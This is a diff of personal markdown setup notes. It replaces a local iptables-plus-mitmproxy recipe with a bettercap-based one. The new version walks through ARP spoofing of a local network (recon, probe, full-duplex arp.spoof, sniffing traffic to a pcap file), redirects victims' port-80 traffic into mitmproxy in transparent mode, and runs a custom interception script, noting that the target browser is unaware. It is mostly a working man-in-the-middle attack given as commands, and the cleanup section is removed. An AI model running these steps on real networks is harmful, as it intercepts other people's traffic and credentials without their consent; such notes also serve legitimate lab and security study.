@@ -1,44 +1,38 @@
-How to set up mitmproxy
-=======================
-#### Step 1: make sure desired port is unused (8080)
+How to set up mitmproxy with bettercap
+======================================
+Step 1: make sure desired port is unused (8080 in this context)
+-----------------------------------------------
+- mitmproxy will listen on this port
 
-#### Step 2: make sure iptables is configured with following code: (STILL A BIT UNSURE)
-```bash
-sudo iptables -t nat -A OUTPUT -p tcp -m owner ! --uid-owner root --dport 80 -j REDIRECT --to-port 8080
+Step 2: run bettercap with following commands:
+----------------------------------------------
+```bettercap
+set net.sniff.verbose true;
+set net.sniff.output [FILENAME.pcap];
+set arp.spoof.fullduplex true;
+set arp.spoof internal true;
+net.recon on;
+net.probe on;
+net.sniff on;
+arp.spoof on;
 ```
-    * redirects all traffic in port 80 to 8080 (where mitmproxy will listen)
-    * is necessary, as mitmproxys transparent mode requires redirection of traffic and no direct traffic
-    * apparently, doing this will only be useful if traffic is meant from local clients
-    * ! --uid-owner root is to block infinite traffic from the same user. (I think only useful if testing locally)
-    * might need to use PREROUTING option instead of OUTPUT for external clients
+- this will activate modules to let the arp.spoof module function
+- after stopping the module net.sniff with ```net.sniff off```, it will write the traffic in FILENAME.pcap
 
-ChatpGPT says that this is needed for external source:
-```bash
-sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
+Step 3: let bettercap redirect traffic to mitmproxy
+---------------------------------------------------
+```bettercap
+set arp.proxy.dst_port 8080;
+set arp.proxy.src_port 80;
+arp.proxy on
 ```
-    * apparently redirects incoming traffic
-    * apparently used when your machine acts as a gateway or receives traffic from other devices
 
-#### Step 3: run following code:
+Step 4: run mitmproxy with following code:
+------------------------------------------
 ```bash
-sudo mitmproxy --mode transparent -p 8080 -s mad_server.py
+sudo mitmproxy --mode transparent -p 8080 -s [SCRIPT.py]
 ```
-    * mitmproxy has to run in transparent mode because browser is unaware of the proxy
-        * normally, the browser knows if mitmproxy is listening and this requires manual setup on the browser side
-        * transparent mode goes under the assumption that the browser isn't aware of it listening (necessary for intercepting)
-    * -s [script] tells mitmproxy which python script to use
-
-Clean up (IMPORTANT!)
-=====================
-#### To see if the iptables rule still exists, run following code:
-    ```bash
-    sudo iptables -t nat -L -n -v --line-numbers
-    ```
-    * if any rules with the numbers 80 and 8080 are listed, you probably still have the mitmproxy setup
-    * delete this if done with mitmproxy work
-
-#### To delete the iptables rule (redirect from 80 to 8080), run following code:
-    ```bash
-    sudo iptables -t nat -D OUTPUT <line number of rule>
-    ```
-
+* mitmproxy has to run in transparent mode because target browser is unaware of the proxy
+    * normally, the browser knows if mitmproxy is listening and this requires manual setup on the browser side
+    * transparent mode goes under the assumption that the browser isn't aware of it listening (necessary for intercepting)
+* -s SCRIPT.py tells mitmproxy which python script to use
